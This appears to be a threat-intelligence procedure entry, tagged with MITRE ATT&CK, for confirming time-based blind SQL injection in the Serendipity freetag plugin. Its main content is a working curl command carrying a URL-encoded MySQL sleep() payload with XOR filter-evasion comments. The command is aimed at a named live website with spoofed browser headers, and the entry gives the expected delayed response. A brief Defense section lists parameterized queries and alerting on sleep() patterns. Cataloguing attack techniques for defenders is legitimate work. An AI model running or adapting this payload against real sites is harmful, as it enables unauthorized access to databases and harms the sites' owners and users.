---
id: proc-2
tags:
  - sqli
  - blind-sqli
  - time-based
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-sqli-payload-sleep-3]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.906Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject Time-Based SQL Payload with 3-Second Delay

## Summary

This procedure injects a conditional SQL sleep payload into the tag parameter to induce a detectable delay, confirming blind SQL injection execution in the Serendipity freetag plugin.

## Description

The vulnerability arises from unsanitized user input in the tag parameter, directly concatenated into SQL queries. The payload uses MySQL's sleep() function conditioned on now()=sysdate() to trigger a 3-second delay if executed, with XOR comments to evade basic filtering. Response time measurement confirms injection.

## Requirements

1. Baseline response time established
2. Access to target via HTTPS
3. HTTP headers mimicking browser requests

## Defense

Defensive measures and detection strategies:

- Parameterize queries with PDO or mysqli_prepare
- Rate-limit requests to detect timing attacks
- Log and alert on anomalous query patterns involving sleep() or delays

## Objectives

1. Confirm SQL payload interpretation
2. Measure injection-induced delay
3. Validate bypass of string handling

## Instructions

### Step 1: Craft and Send Payload

**Context**: Replace the tag with the encoded SQL payload and observe timing.

**Command** ([[commands/curl-sqli-payload-sleep-3]]):
```bash
curl -s -w "%{time_total}s" "https://betterscience.org/plugin/tag/if(now()%3dsysdate()%2csleep(3)%2c0)/%2a'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22%2f*" -H "Host: betterscience.org" -H "Cookie: [session cookies]" -H "Referer: https://betterscience.org/" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64)..." -H "X-Requested-With: XMLHttpRequest" > /dev/null
```

> The payload if(now()=sysdate(),sleep(3),0) triggers delay; URL-encoded for GET. Expected: ~3.276s response.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-sqli-payload-sleep-3]]

## Tools Used


## Tags

- [[sqli]]
- [[blind-sqli]]
